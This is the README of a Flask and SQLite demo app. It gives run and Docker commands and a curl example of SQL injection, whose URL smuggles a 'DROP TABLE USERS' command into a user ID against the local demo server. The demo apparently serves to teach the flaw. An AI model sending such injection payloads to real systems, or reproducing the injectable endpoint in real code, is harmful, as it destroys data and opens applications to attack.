# flask_demo
Flask w\ SQL Light Demonstration

To start website:
```sh
python3 start.py
```

## Demo points
Docker commands
```sh
docker build -t flask_demo:local .
docker run --rm --network=host -p 5050:5050 --name flask_demo flask_demo:local
```

SQL Injection Exploit
```sh
curl -X PUT "http://localhost:5050/users/6;DROP%20TABLE%20USERS;--?firstName=test"
```
More info about exploit can be found <https://www.pythonforengineers.com/xkcd-style-sql-injection-hack-in-python/>
